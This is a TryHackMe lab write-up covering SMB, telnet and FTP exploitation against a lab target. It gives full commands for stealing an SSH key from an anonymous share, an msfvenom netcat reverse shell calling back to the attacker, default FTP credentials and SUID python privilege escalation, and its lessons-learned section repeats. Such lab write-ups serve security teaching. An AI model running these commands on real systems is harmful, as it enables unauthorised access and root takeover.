# NetworkServices
Network Serivces Lab - using nmap, enum4linux, smbclient, netcat, msfvenom, and privilege escalation via SUID exploitation.

By Ramyar Daneshgar 

---

## Task 1: Get Connected

To begin, I deployed the target machine within the TryHackMe VPN environment. This is essential in any CTF or red team simulation to ensure a secure, isolated network path to the target. My attacking system, Kali Linux, was connected through OpenVPN, which tunneled all traffic securely into the THM lab infrastructure. Without this initial network setup, I wouldn't be able to scan or interact with the target system at all.

---

## Task 2: Understanding SMB

### What is SMB?

Server Message Block (SMB) is a Layer 7 (application layer) protocol used to share files, printers, and named pipes across a network. It functions over TCP, typically on ports 139 (NetBIOS over TCP) and 445 (direct host SMB).

### Why It Matters

From a security perspective, SMB is notorious for misconfigurations. Misconfigured shares may:

* Allow unauthorized access (null or anonymous sessions)
* Contain sensitive files like configuration backups, credentials, or SSH keys
* Run legacy versions (SMBv1), which are susceptible to remote code execution exploits like EternalBlue (CVE-2017-0144)

Understanding how SMB works is crucial for both attackers (reconnaissance and lateral movement) and defenders (hardening and monitoring).

---

## Task 3: Enumerating SMB

### Step 1: Port Scan with Nmap

I launched a TCP full-port scan to discover exposed services:

```bash
nmap -sC -sV -Pn -p- [target_IP]
```

Explanation:

* `-sC`: Runs default Nmap Scripting Engine (NSE) scripts for enumeration (e.g., smb-os-discovery)
* `-sV`: Performs service version detection, which aids in vulnerability mapping
* `-Pn`: Skips ICMP ping, useful if the host blocks ping responses
* `-p-`: Scans all 65535 TCP ports instead of just the top 1000

This revealed that SMB services were running on 139 and 445, and SSH on 22.

### Step 2: Enumerating Shares and Users

To further enumerate the SMB service, I used:

```bash
enum4linux -a [target_IP]
```

This tool automates NetBIOS and SMB info gathering. Key outputs include:

* Domain/workgroup name
* NetBIOS hostname
* List of user accounts (via RID cycling or guest access)
* Shared folders with access permissions

This information is vital for identifying attack surface and building usernames for brute force or kerberoasting attempts.

### Step 3: Access the Share Anonymously

I attempted to connect to the `profiles` share without credentials:

```bash
smbclient //IP/profiles -N
```

The `-N` option tells `smbclient` not to prompt for a password, simulating a null session. Successfully listing contents here indicated broken access control and unauthenticated access to internal user data.

### Step 4: Extracting the SSH Key

While browsing, I discovered `.ssh/id_rsa`. This file is a **private key**, and it's highly sensitive because it allows SSH authentication without a password if no passphrase is configured.

```bash
get id_rsa
```

Downloading this file meant I could attempt a direct remote login as that user—essentially privilege escalation over the network via credential leakage.

---

## Task 4: Exploiting SMB via SSH Key

### Step 1: Adjust SSH Key Permissions

SSH requires strict file permissions to prevent key misuse:

```bash
chmod 600 id_rsa
```

Without this, the SSH client will reject the key to prevent unintentional key exposure (a basic secure configuration control).

### Step 2: SSH Access

Now equipped with the key, I initiated SSH login:

```bash
ssh -i id_rsa john@[target_IP]
```

This succeeded, showing that the private key was:

* Not passphrase-protected
* Not revoked
* Associated with an active account with shell access

This highlights a real-world risk: unmanaged keys and poor credential hygiene.

---

## Task 5: Understanding Telnet

Telnet is a cleartext protocol from the pre-SSH era. It offers basic terminal access over TCP, typically on port 23. It lacks encryption and authentication integrity, making it unsuitable for secure environments. Still, it's occasionally found in legacy equipment or IoT devices, which often become pivot points for adversaries.

---

## Task 6: Enumerating Telnet

### Step 1: Full Port Scan

Since my earlier scan didn’t reveal Telnet, I re-ran a full TCP scan:

```bash
nmap -sV -p- [target_IP]
```

This uncovered port 8012. Connecting to it with Telnet:

```bash
telnet [target_IP] 8012
```

The banner read `SKIDY’S BACKDOOR`, a strong indication of a custom or backdoored service. Recognizing backdoors is key in threat hunting and malware analysis.

---

## Task 7: Exploiting Telnet

### Step 1: Test Command Execution

I needed to verify whether the Telnet service was executing commands. I used `tcpdump` to monitor ICMP (ping) requests:

```bash
sudo tcpdump ip proto \icmp -i tun0
```

From Telnet:

```
.RUN ping [attacker_IP] -c 1
```

Getting a ping confirmed **command injection** or arbitrary command execution. This would typically be categorized under CWE-78: OS Command Injection.

### Step 2: Reverse Shell Payload

I created a reverse shell using `msfvenom`:

```bash
msfvenom -p cmd/unix/reverse_netcat LHOST=[attacker_IP] LPORT=4444 R
```

This payload executes a reverse connection using `nc`, giving me an interactive shell. This technique is commonly used post-exploitation to maintain access.

### Step 3: Listen for Incoming Connection

```bash
nc -lvnp 4444
```

When the payload was executed, it established a TCP connection back to my listener, granting full shell access on the target system. This forms the basis of lateral movement and persistence.

---

## Task 8–10: Exploiting FTP

### Step 1: Anonymous Login

FTP transmits credentials and data unencrypted over port 21. I tested for anonymous access:

```bash
ftp [target_IP]
```

`PUBLIC_NOTICE.txt` was accessible, indicating the FTP root directory allowed global read access.

### Step 2: Authenticated Login

I tested default credentials based on enumeration hints:

```bash
ftp [target_IP]
Username: mike
Password: password
```

They worked—this is a classic example of weak authentication. I then retrieved the flag:

```bash
get ftp.txt
```

This emphasizes why enforcing password policies and monitoring for brute force activity are key defensive measures.

---

## Task 11: Privilege Escalation via SUID

### Step 1: Find SUID Binaries

I searched for binaries with the SUID permission bit, which lets users execute the binary with the permissions of its owner (often root):

```bash
find / -perm -u=s -type f 2>/dev/null
```

SUID misconfigurations are a goldmine for privilege escalation. Finding `/usr/bin/python` set with SUID was a major red flag.

### Step 2: Exploit SUID Python

I leveraged the following one-liner to spawn a privileged shell:

```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

`execl()` replaces the current process with a new one—in this case, `/bin/sh`—while `-p` retains the SUID (root) privilege context.

### Step 3: Read Final Flag

I verified root access:

```bash
cat /root/root.txt
```

This confirmed successful privilege escalation and full system compromise.

---

## Lessons Learned

1. Full port scanning is essential—many services hide on non-default ports.
2. SMB share misconfigurations can leak credentials, private keys, or sensitive data.
3. Telnet should be fully deprecated; it often opens up command injection vectors.
4. Default FTP accounts remain a low-hanging fruit for attackers.
5. SUID binaries must be regularly audited to avoid local privilege escalation vectors.

---

## Real-World Applicability

* SMB exposure, SUID exploitation, and Telnet backdoors frequently appear in internal penetration tests and red team operations.
* These techniques demonstrate how misconfiguration, not just exploits, can lead to domain compromise.
* Adversaries often chain these missteps—from share enumeration to SSH key theft to SUID exploitation—to escalate privileges.
* These lessons tie into CIS Controls (Control 4, 6, and 16), MITRE ATT\&CK techniques (T1078, T1059), and common audit findings in ISO 27001/NIST 800-53 compliance efforts.

This exercise emphasized how foundational enumeration and layered exploitation allow attackers to progress from unauthenticated access to root control. Defenders must focus on misconfiguration detection, protocol hardening, and privileged binary auditing to contain these threats.



---

## Lessons Learned

1. Always scan all ports—default scans often miss non-standard services.
2. Misconfigured SMB shares can expose sensitive authentication material.
3. Legacy services like Telnet still exist and often lead to command injection.
4. FTP is still deployed with default or weak credentials.
5. SUID binaries should be audited regularly—interpreters like Python should never have elevated privilege.

* These misconfigurations mirror those seen in real networks, especially in older or poorly maintained infrastructure.
* SMB and FTP are often exposed internally with weak configurations.
* Telnet backdoors reflect risks in IoT or legacy embedded systems.
* SUID escalation is a common red team technique for lateral movement and root access.
